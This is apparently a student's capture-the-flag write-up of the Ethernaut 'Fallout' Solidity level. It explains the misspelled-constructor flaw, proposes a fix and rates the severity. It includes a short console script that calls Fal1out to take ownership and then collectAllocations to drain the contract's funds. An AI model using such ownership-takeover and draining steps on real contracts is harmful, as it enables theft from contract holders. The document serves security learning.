## Level 2 — Fallout

**Vulnerability:**
in the contract fallout there are two vulnerabilities 
1.  the constructor is mispelled  
`function Fal1out() ...`  
This exploit authorizes the caller as the owner of the contract
2. the contract is out data  
`pragma solidity ^0.6.0;`  
always update contract to the most current version to avoid fixed exploitation, common practice

**Independent Finding:**
these exploits were easy to find just by reading

**Personal Gaps:**
still not able to write solidity contract freehand but logic studying of zombiesolidity is closing the gap

**Exploit:**
```javascript
//Step 1: first you need to exploit the mispelled contractor function to become owner
await contract.Fal1out()
//Step 2: confirm you are now the owner
await contract.owner() // you should see your wallet address id
//extra step** could see the contract balance
await web3.eth.getBalance(contract.address)
// Step 3: (final) drain contract funds
await contract.collectAllocations()
```
**Fix:**
```js
// Step 1: update contract version to latest version
pragma solidity ^0.8.0; // or whatever it is

// Step 2: update constructor function
constructor() {
    owner = msg.sender;
    //allocations[owner] = msg.value; -> no longer needed
}

```

**Audit Flag:**
[High] this could cause the drainage of this whole contract if not fixed immediately

**Solodit Match:**
attempt to find - 

---
